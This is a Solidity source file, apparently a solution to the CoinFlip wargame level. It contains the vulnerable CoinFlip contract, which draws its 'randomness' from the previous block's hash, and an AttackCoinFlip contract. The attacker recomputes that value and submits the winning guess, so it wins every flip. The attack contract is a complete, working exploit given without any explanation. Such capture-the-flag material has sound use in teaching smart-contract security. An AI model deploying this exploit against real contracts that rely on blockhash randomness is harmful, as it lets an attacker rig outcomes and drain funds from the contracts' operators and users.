// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract AttackCoinFlip {
    using SafeMath for uint256;

    uint256 public lastHash;
    uint256 public FACTOR;
    CoinFlip private _flip;

    constructor(address flip) public {
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        _flip = CoinFlip(flip);
    }

    function getBlockNumber() public view returns(uint) {
      return block.number;
    }

    function attackFlip() public returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        
        if (lastHash == blockValue) revert();

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return _flip.flip(side);
    }

}